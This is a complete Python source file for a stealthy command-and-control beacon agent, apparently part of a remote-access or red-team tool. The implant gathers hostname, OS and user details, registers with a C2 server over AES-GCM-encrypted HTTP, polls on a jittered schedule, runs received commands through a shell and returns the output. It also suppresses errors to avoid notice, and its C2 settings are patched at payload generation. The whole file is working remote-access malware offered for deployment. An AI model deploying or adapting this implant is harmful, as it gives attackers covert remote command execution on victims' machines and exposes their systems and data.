#!/usr/bin/env python3
"""
Stealthy HTTP/TLS Beaconing Agent.
Can be compiled with PyInstaller for deployment.
"""

import os
import logging
import sys
import time
import json
import uuid
import socket
import platform
import subprocess
import random

try:
    import requests
    import urllib3
    # Disable warnings for self-signed certs in dev
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    pass

import base64
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

class BeaconAgent:
    def __init__(self, c2_host: str, c2_port: int, psk: str, use_tls: bool = False):
        self.scheme = "https" if use_tls else "http"
        self.c2_url = f"{self.scheme}://{c2_host}:{c2_port}"
        self.agent_id = None
        self.interval = 60
        self.jitter = 10
        self.session = requests.Session()
        self.session.verify = False # In prod, use real certs
        
        # Crypto
        self.key = bytes.fromhex(psk)
        self.aesgcm = AESGCM(self.key)

    def encrypt(self, data: dict) -> str:
        nonce = os.urandom(12)
        plaintext = json.dumps(data).encode("utf-8")
        ciphertext = self.aesgcm.encrypt(nonce, plaintext, None)
        return base64.b64encode(nonce + ciphertext).decode("utf-8")

    def decrypt(self, b64_ciphertext: str) -> dict:
        raw = base64.b64decode(b64_ciphertext)
        if len(raw) < 12: return {}
        nonce, ciphertext = raw[:12], raw[12:]
        plaintext = self.aesgcm.decrypt(nonce, ciphertext, None)
        return json.loads(plaintext.decode("utf-8"))

    def collect_sysinfo(self) -> dict:
        return {
            "hostname": socket.gethostname(),
            "os": f"{platform.system()} {platform.release()}",
            "user": os.environ.get("USER", os.environ.get("USERNAME", "unknown")),
            "arch": platform.machine()
        }

    def register(self) -> bool:
        """Register with the C2 server."""
        try:
            info = self.collect_sysinfo()
            payload = {"data": self.encrypt(info)}
            resp = self.session.post(f"{self.c2_url}/register", json=payload, timeout=10)
            if resp.status_code == 200:
                data = self.decrypt(resp.json().get("data", ""))
                self.agent_id = data.get("agent_id")
                self.interval = data.get("interval", 60)
                self.jitter = data.get("jitter", 10)
                return True
        except Exception as _exc:
            logging.debug(f"Suppressed in agent.py: {_exc}")
        return False

    def execute_task(self, command: str) -> dict:
        """Execute a shell command locally."""
        try:
            output = subprocess.check_output(
                command, shell=True, stderr=subprocess.STDOUT, timeout=60
            )
            return {"command": command, "output": output.decode("utf-8", errors="replace")}
        except subprocess.CalledProcessError as e:
            return {"command": command, "output": e.output.decode("utf-8", errors="replace")}
        except subprocess.TimeoutExpired:
            return {"command": command, "output": "[!] Command timed out."}
        except Exception as e:
            return {"command": command, "output": f"[!] Execution failed: {str(e)}"}

    def beacon(self, results: list = None):
        """Check in with C2 and retrieve tasks."""
        if not self.agent_id:
            return
            
        beacon_data = {"agent_id": self.agent_id}
        if results:
            beacon_data["results"] = results
            
        try:
            payload = {"data": self.encrypt(beacon_data)}
            resp = self.session.post(
                f"{self.c2_url}/beacon/{self.agent_id}",
                json=payload,
                timeout=10
            )
            if resp.status_code == 200:
                data = self.decrypt(resp.json().get("data", ""))
                tasks = data.get("tasks", [])
                
                new_results = []
                for task in tasks:
                    res = self.execute_task(task["command"])
                    res["task_id"] = task["task_id"]
                    new_results.append(res)
                    
                # If we got results, beacon immediately to return them
                if new_results:
                    self.beacon(results=new_results)
                    
        except Exception as e:
            pass # Suppress network errors to stay stealthy

    def run(self):
        """Main loop."""
        while not self.register():
            time.sleep(self.interval)
            
        while True:
            # Jitter sleep calculation
            sleep_time = self.interval + random.uniform(-self.jitter, self.jitter)
            sleep_time = max(10, sleep_time) # Minimum 10s sleep
            
            time.sleep(sleep_time)
            self.beacon()


if __name__ == "__main__":
    # Hardcoded C2 config (patched during payload generation)
    C2_HOST = "127.0.0.1"
    C2_PORT = 8443
    USE_TLS = False
    
    agent = BeaconAgent(C2_HOST, C2_PORT, psk="0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef", use_tls=USE_TLS)
    agent.run()
